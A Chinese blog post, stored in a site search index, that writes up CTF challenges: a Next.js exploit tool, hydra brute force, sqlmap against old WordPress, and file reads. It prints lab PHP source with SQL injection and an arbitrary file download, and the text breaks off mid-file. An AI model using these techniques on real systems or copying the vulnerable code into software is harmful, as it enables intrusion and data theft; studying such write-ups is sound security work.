<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>破阵阁-巅峰赛</title>
    <link href="/%E7%A0%B4%E9%98%B5%E9%98%81-%E5%B7%85%E5%B3%B0%E8%B5%9B/"/>
    <url>/%E7%A0%B4%E9%98%B5%E9%98%81-%E5%B7%85%E5%B3%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>意识到了自己其实还挺菜的，比赛的三小时一个没做出来</p><h1 id="这个笔记真的安全吗？"><a href="#这个笔记真的安全吗？" class="headerlink" title="这个笔记真的安全吗？"></a>这个笔记真的安全吗？</h1><p>昨天比赛的时候没做出来，后面结束后群里大佬提示是最近挺火的一个next.js的漏洞，就是哪个评分10分的哪个</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770521332749-bf7e0efe-8ba7-41b1-9b09-c605a2487372.png"></p><p>那我们找个exp用一下看看</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770521478215-1160f3dc-f61b-440e-a805-2bcbed4eae93.png"></p><p>成功执行啊，那后面找找flag文件，后面也可以手动复现一下这个漏洞，挺有学习价值的</p><p>但是不知道为什么，这个脚本执行ls命令返回500，然后就换了一个工具</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770522403489-b4e7097b-b137-4561-9ad1-b15bbb131f2f.png"></p><p>然后拿到flag</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770522442725-ff2b1457-925a-4627-9221-01fe6d49faf8.png"></p><p>工具在这：<a href="https://github.com/Rsatan/Next.js-Exploit-Tool/releases/tag/v1.3.0">https://github.com/Rsatan/Next.js-Exploit-Tool/releases/tag/v1.3.0</a></p><h1 id="secure-file-viewer"><a href="#secure-file-viewer" class="headerlink" title="secure file viewer"></a>secure file viewer</h1><p>这个题是一个文件包含的题，比赛的时候试了挺久没做出啦，后面群里大佬提示有bak文件，然后现在重新做一次</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770526265618-ed9e4391-0994-4d89-9192-b3be6faef540.png"></p><p>得到源码</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770526305883-b1cf2ece-d0ea-4237-bc83-88ee6acda04e.png"></p><p>直接问Gemini</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770526640629-0123ce23-d62c-4d7f-beb7-cc5a64cadde8.png"></p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770526684120-846ee144-d85a-480e-a176-9f99847e5ecc.png"></p><p>最后成功拿到，以后扫路径还是要多加点条件</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770526710523-fe9c538f-a7e9-43c3-b2b4-116181a4f8aa.png"></p><h1 id="源自于真实"><a href="#源自于真实" class="headerlink" title="源自于真实"></a>源自于真实</h1><p>初步看起来应该是爆破</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770526814840-3bcdfed8-370c-4f15-bd71-b825468e24d1.png"></p><p>那hydra爆破一下admin试试</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770527501323-49beab63-3183-4bc0-a3f0-babb9bb6874c.png"></p><p>先等着爆破admin，我们试试题目给的初试用户</p><p>发现有验证码</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770527536186-a6a2579d-347f-47aa-b6e1-6870a7c651ae.png"></p><p>抓包发现可以更改verify用户</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770527600342-64fa8ec1-a234-4a19-9b0c-4671ac43cf50.png"></p><p>然后现在爆破看看</p><p>发现全部失败，换回sectest看看</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770527970790-d2c0eb51-5771-4d17-b878-8bc696270482.png"></p><p>但是很奇怪，我后面又爆破了一遍admin，又出来了</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770529143642-f80e4105-fbe5-4868-803b-669e72a5f9ff.png"></p><p>我不知道是不是我一开始请求了一下verify还是上次我没看到成功的爆破</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770529186482-6fbab05f-c30d-4152-8e56-76381de4b3e6.png"></p><p>成功拿下</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770529204182-3cb09c48-2f2e-499a-9876-c5b9872d2deb.png"></p><h1 id="东西很老，能用就好"><a href="#东西很老，能用就好" class="headerlink" title="东西很老，能用就好"></a>东西很老，能用就好</h1><p>打开是一个很老的wordpress站点</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770529297851-286672b7-7d5d-4376-83d6-c4797719c3d0.png"></p><p>搜了一下发现有漏洞</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770529353373-eb16a16a-6a3c-4146-96e0-2dfb3e9ece7d.png"></p><p>wpscan扫出来也是这些漏洞</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770530910035-4899e6e7-293d-4c29-b438-1c3ca7936008.png"></p><p>但是试了exploit-db的脚本，发现不太好使，然后换sqlmap扫</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770531082941-4ed8cf2b-e04a-470a-9d11-aa50670d84c1.png"></p><p>一个个试，然后找到一个权限高的，改模板页面</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770532152907-a4c70e78-bb39-45b0-b126-d7fd378a13d8.png"></p><p>然后成功读到</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770532221278-ca63c272-2b1d-461b-bbad-48cd672e0dea.png"></p><h1 id="综合挑战"><a href="#综合挑战" class="headerlink" title="综合挑战"></a>综合挑战</h1><p>进去是一个sql注入测试页面</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770532855310-61c9657b-5ef5-433c-88b5-44511d0ee784.png"></p><p>sqlmap没扫出来，看看有没有其他文件</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770532841314-a54b51f9-71a7-4bd3-aa3d-4247f53b7e77.png"></p><p>试了一下test可以读文件，add可以上传图片</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770532963433-6a8567ec-1748-4527-9b68-7a1a7740be92.png"></p><p>但是不知道文件去哪了</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770533085235-7512dd39-bc60-48fb-8a86-bc748537dd33.png"></p><p>那试试能不能读网页文件</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770533192566-11b80a64-10da-43b3-b333-675b4f2be16b.png"></p><p>可以读，那我们把这些文件都读了看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br>ob_start();<br>session_start();<br><br>include(&#x27;c.php&#x27;);<br>include(&#x27;head.php&#x27;);<br><span class="hljs-meta prompt_">if(@$</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;logged&#x27;</span>]!=<span class="hljs-literal">true</span>)</span><br>&#123;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-string">&#x27;&#x27;</span>;</span><br><br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">if($</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;logged&#x27;</span>]==<span class="hljs-literal">true</span> &amp;&amp;  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>)</span><br>&#123;<br><br>echo &quot;you are logged in :)&quot;;<br>header(&#x27;Location: panel.php&#x27;, true, 302);<br>&#125;<br>else<br>&#123;<br>echo &#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;<br>&lt;font size=8 face=&quot;comic sans ms&quot;&gt;--==[[ Lab ]]==--&lt;/font&gt;<br>&lt;br&gt;&lt;br&gt;<br>Show me your SQLI skills &lt;br&gt;<br>&lt;form method=post&gt;<br>Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;<br>&lt;input type=submit name=login value=&quot;let\&#x27;s login&quot;&gt;&#x27;;<br>&#125;<br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))</span><br>&#123;<br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">uname</span>=str_replace(<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&#x27;,urldecode($_POST[&#x27;</span>un<span class="hljs-string">&#x27;]));</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-string">pass=str_replace(&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,urldecode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">run=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;</span><span class="hljs-string">&#x27;.$pass.&#x27;</span>\<span class="hljs-string">&#x27; and uname=\&#x27;</span><span class="hljs-string">&#x27;.$uname.&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">result = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);</span><br>if (mysqli_num_rows($result) &gt; 0) &#123;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">row = mysqli_fetch_assoc(<span class="hljs-variable">$result</span>);</span><br>   echo &quot;You are allowed&lt;br&gt;&quot;;<br>   $_SESSION[&#x27;logged&#x27;]=true;<br>   $_SESSION[&#x27;admin&#x27;]=$row[&#x27;username&#x27;];<br><br> header(&#x27;Location: panel.php&#x27;, true, 302);<br><br>&#125;<br>else<br>&#123;<br>echo &quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;;<br>&#125;<br><br>&#125;<br>echo &quot;&lt;font size=5 face=\&quot;comic sans ms\&quot; style=\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;;<br><br>?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br><br><br>function file_download($download)<br>&#123;<br><span class="hljs-meta prompt_">if(file_exists($</span><span class="language-bash">download))</span><br>&#123;<br>header(&quot;Content-Description: File Transfer&quot;); <br><br>header(&#x27;Content-Transfer-Encoding: binary&#x27;);<br>header(&#x27;Expires: 0&#x27;);<br>header(&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;);<br>header(&#x27;Pragma: public&#x27;);<br>header(&#x27;Accept-Ranges: bytes&#x27;);<br>header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.basename($download).&#x27;&quot;&#x27;); <br>header(&#x27;Content-Length: &#x27; . filesize($download));<br>header(&#x27;Content-Type: application/octet-stream&#x27;); <br>ob_clean();<br>flush();<br>readfile ($download);<br>&#125;<br>else<br>&#123;<br>echo &quot;file not found&quot;;<br>&#125;<br><br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_POST[<span class="hljs-string">&#x27;file&#x27;</span>]))</span><br>&#123;<br><span class="hljs-meta prompt_">file_download($</span><span class="language-bash">_POST[<span class="hljs-string">&#x27;file&#x27;</span>]);</span><br>&#125;<br>else&#123;<br><br>echo &#x27;\&#x27;file\&#x27; parameter is empty. Please provide file path in \&#x27;file\&#x27; parameter &#x27;;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br>echo &#x27;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;/script&gt;<br>&lt;title&gt;--==[[Lab]]==--&lt;/title&gt;<br>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;<br>&lt;STYLE&gt;<br>body &#123;<br>    font-family: Tahoma;<br>    color: black;<br>&#125;<br>.side-pan &#123;<br>   margin: 0;<br>   border:0px;<br><br>   width:200px;<br>   padding: 5px 23px;<br>   margin:0px;<br>   -webkit-border-radius: 0px;<br>   -moz-border-radius: 0px;<br>   border-radius: 0px;<br>   border-bottom: 1px solid black;<br>   color: white;<br>   font-size: 20px;<br>   font-family: Georgia, serif;<br>   text-decoration: none;<br>   vertical-align: left;<br>   align:left;<br>   &#125;<br><span class="hljs-meta prompt_">   div#</span><span class="language-bash">left &#123;</span><br>    width: 100%;<br>    height: 50px;<br>    float: left;<br>&#125;<br><span class="hljs-meta prompt_">div#</span><span class="language-bash">right &#123;</span><br>    margin-left: 20%;<br>    height: 50px;<br>color: white;<br>    font-size: 20px;<br>    font-family: Georgia, serif;<br>&#125;<br>.main div &#123;<br>  float: left;<br>  clear: none;<br>&#125;<br>submit &#123;<br>BORDER:  buttonhighlight 2px outset;<br>BACKGROUND-COLOR: Black;<br>width: 30%;<br>color: #FFF;<br>&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">t input[<span class="hljs-built_in">type</span>=\<span class="hljs-string">&#x27;submit\&#x27;</span>]&#123;</span><br>COLOR: White;<br>border:none;<br>BACKGROUND-COLOR: black;<br>&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">t input[<span class="hljs-built_in">type</span>=\<span class="hljs-string">&#x27;submit\&#x27;</span>]:hover &#123;</span><br><br>BACKGROUND-COLOR: #ff9933;<br>color: black;<br><br>&#125;<br>tr &#123;<br>BORDER: dashed 1px #333;<br>color: #000;<br>&#125;<br>td &#123;<br>BORDER: dashed 0px ;<br>&#125;<br>.table1 &#123;<br>BORDER: 0px Black;<br>BACKGROUND-COLOR: Black;<br>color: #FFF;<br>&#125;<br>.td1 &#123;<br>BORDER: 0px;<br>BORDER-COLOR: #333333;<br>font: 7pt Verdana;<br>color: Green;<br>&#125;<br>.tr1 &#123;<br>BORDER: 0px;<br>BORDER-COLOR: #333333;<br>color: #FFF;<br>&#125;<br>table &#123;<br>BORDER: dashed 2px #333;<br>BORDER-COLOR: #333333;<br>BACKGROUND-COLOR: #191919;;<br>color: #FFF;<br>&#125;<br>textarea &#123;<br>border: dashed 2px #333;<br>BACKGROUND-COLOR: Black;<br>font: Fixedsys bold;<br>color: #999;<br>&#125;<br>A:link &#123;<br>border: 1px;<br>COLOR: red; TEXT-DECORATION: none<br>&#125;<br>A:visited &#123;<br>COLOR: red; TEXT-DECORATION: none<br>&#125;<br>A:hover &#123;<br>color: White; TEXT-DECORATION: none<br>&#125;<br>A:active &#123;<br>color: white; TEXT-DECORATION: none<br>&#125;<br><br>.download &#123;<br>   margin: 0;<br>   border:0px;<br>   background:#C0C0C0;<br>   width:110px;<br>   height:30px;<br><br>   margin:0px;<br>   -webkit-border-radius: 0px;<br>   -moz-border-radius: 0px;<br>   border-radius: 6px;<br>   border-bottom: 1px solid black;<br>   color: #28597a;<br>   font-size: 20px;<br>   font-family: Georgia, serif;<br>   text-decoration: none;<br>   vertical-align: left;<br>   align:left;<br>   &#125;<br><br>&lt;/STYLE&gt;<br>&lt;script type=&quot;text/javascript&quot;&gt;<br>&lt;!--<br>    function lhook(id) &#123;<br>       var e = document.getElementById(id);<br>       if(e.style.display == \&#x27;block\&#x27;)<br>          e.style.display = \&#x27;none\&#x27;;<br>       else<br>          e.style.display = \&#x27;block\&#x27;;<br>    &#125;<br><span class="hljs-meta prompt_">//--&gt;</span><span class="language-bash"></span><br><span class="language-bash">&lt;/script&gt;</span><br>&#x27;;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br><span class="hljs-meta prompt_">#</span><span class="language-bash">header( <span class="hljs-string">&#x27;Z-Powered-By:its chutiyapa xD&#x27;</span> );</span><br>header(&#x27;X-Frame-Options: SAMEORIGIN&#x27;);<br>header( &#x27;Server:testing only&#x27; );<br>header( &#x27;X-Powered-By:testing only&#x27; );<br><br>ini_set( &#x27;session.cookie_httponly&#x27;, 1 );<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">conn = mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;ica&quot;</span>,<span class="hljs-string">&quot;fEjGCK7bDHdiXocN&quot;</span>,<span class="hljs-string">&quot;ica_lab&quot;</span>);</span><br><br>// Check connection<br>if (mysqli_connect_errno())<br>  &#123;<br>  echo &quot;connection failed -&gt;  &quot; . mysqli_connect_error();<br>  &#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br>include(&#x27;c.php&#x27;);<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">_POST[<span class="hljs-string">&#x27;continue&#x27;</span>]))</span><br>&#123;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">run=<span class="hljs-string">&#x27;select * from users &#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">result = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);</span><br>if (mysqli_num_rows($result) &gt; 0) &#123;<br>echo &quot;&lt;table width=90% &gt;&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;User&lt;/td&gt;&lt;td&gt;Address&lt;/td&gt;&lt;td&gt;Image&lt;/td&gt;&lt;/tr&gt;&quot;;<br><span class="hljs-meta prompt_"> while($</span><span class="language-bash">row = mysqli_fetch_assoc(<span class="hljs-variable">$result</span>))</span> <br>   &#123;<br>   echo &#x27;&lt;tr&gt;&lt;td&gt;&#x27;.$row[&#x27;id&#x27;].&#x27;&lt;/td&gt;&lt;td&gt;&#x27;.htmlspecialchars ($row[&#x27;name&#x27;],ENT_COMPAT).&#x27;&lt;/td&gt;&lt;td&gt;&#x27;.htmlspecialchars ($row[&#x27;address&#x27;],ENT_COMPAT).&#x27;&lt;/td&gt;&lt;td&gt;&lt;img src=&quot;uploaded_images/&#x27;.htmlspecialchars ($row[&#x27;image&#x27;],ENT_COMPAT).&#x27;&quot; height=90px width=100px&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;;<br>&#125;<br>   echo &quot;&lt;/table&gt;&quot;;<br>&#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br><br><br>echo &#x27;&lt;form  method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>    Select image to upload:<br>    &lt;input type=&quot;file&quot; name=image&gt;<br>&lt;input type=text name=name value=&quot;name&quot;&gt;<br>&lt;input type=text name=address value=&quot;address&quot;&gt;<br>&lt;input type=text name=id value=1337 &gt;<br>    &lt;input type=&quot;submit&quot; value=&quot;upload&quot; name=&quot;upload&quot;&gt;<br>&lt;/form&gt;&#x27;;<br><br><br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>然后ai分析一波</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1770534358949-db221ee2-0985-4a60-a2c0-3575eb6443cf.png"></p><p>panel.php内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br>ob_start();<br>session_start();<br><br>include(&#x27;c.php&#x27;);<br>include(&#x27;head2.php&#x27;);<br><span class="hljs-meta prompt_">if(@$</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;logged&#x27;</span>]!=<span class="hljs-literal">true</span> 